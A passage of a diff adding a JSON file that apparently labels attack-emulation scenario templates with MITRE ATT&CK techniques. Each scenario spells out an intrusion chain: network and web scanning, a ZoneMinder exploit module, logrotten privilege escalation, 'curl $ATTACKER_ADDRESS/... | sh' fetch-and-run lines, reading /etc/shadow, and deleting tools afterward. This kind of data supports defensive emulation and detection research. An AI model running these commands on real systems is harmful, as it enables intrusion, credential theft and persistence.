+     "cmd": "echo empty > log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "/tmp/logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "sleep",
+     "cmd": ""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_d_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_d_b.j2",
+   "source_sha256": "66cb1a54c9fc3ee4681d41629103a2c5597589935bc63522e70f40ccabf5fc85",
+   "n_unlabelled_commands": 18,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/logrotten"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x logrotten"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /var/www/default"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "echo \"if [ \\`id -u\\` -eq 0 ]; then \\$( {{shellcode3333.stdout}} | sh ); fi\" > payload"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "mkdir log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "echo empty > log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "/tmp/logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "sleep",
+     "cmd": ""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.3 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_d_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_d_c.j2",
+   "source_sha256": "9cb68337090a6bc5790125c83f4dfb69f1c1b666dd1f94c320ad8b60ba0a8ed2",
+   "n_unlabelled_commands": 18,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/logrotten"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x logrotten"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /var/www/default"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "echo \"if [ \\`id -u\\` -eq 0 ]; then \\$( {{shellcode3333.stdout}} | sh ); fi\" > payload"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "mkdir log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "echo empty > log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "/tmp/logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "sleep",
+     "cmd": ""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_e_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_e_a.j2",
+   "source_sha256": "2767834ac57063676ca9edb116a2129457dc3f194751378b94957377e7e5b576",
+   "n_unlabelled_commands": 19,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/TODO.md | sh"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_e_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_e_b.j2",
+   "source_sha256": "dc3fca47283447a11f95321b39e932a3ecc907d64847693b70e3aa7e17cdb94c",
+   "n_unlabelled_commands": 19,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/TODO.md | sh"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.3 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_e_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_e_c.j2",
+   "source_sha256": "67ff246877c83ba056e69903b0ee6a09bf84454971f3e1ddcc98182b1a4b3227",
+   "n_unlabelled_commands": 19,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
